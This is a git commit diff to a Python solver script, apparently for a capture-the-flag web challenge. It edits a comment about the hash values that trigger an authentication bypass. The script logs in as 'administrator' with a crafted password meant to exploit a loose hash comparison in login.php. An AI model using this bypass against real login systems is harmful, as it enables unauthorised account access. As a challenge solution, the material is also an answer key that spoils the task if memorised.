febdbe55d360e1e5d4b75250a2365da21c794048
Zerison <133005462+Zerison@users.noreply.github.com>
2025-06-18 15:06:28 +0000

    Update tasksolve3.py

--- tasksolve3.py
+++ tasksolve3.py
@@ -2,7 +2,7 @@
 
 import requests
 TASK_URL = "http://TASK_URL"
-# There are only two hashes which suitable for this vulnerability: "TyNOQHUS" and "34250003024812" 
+# There are only two SHA-256 hashes which suitable for this vulnerability: "TyNOQHUS" and "34250003024812" 
 request = requests.post(f"{TASK_URL}/login.php", data={"login":"administrator", "password":"TyNOQHUS"})
 response = request.text
 if "Неверный логин" not in response:
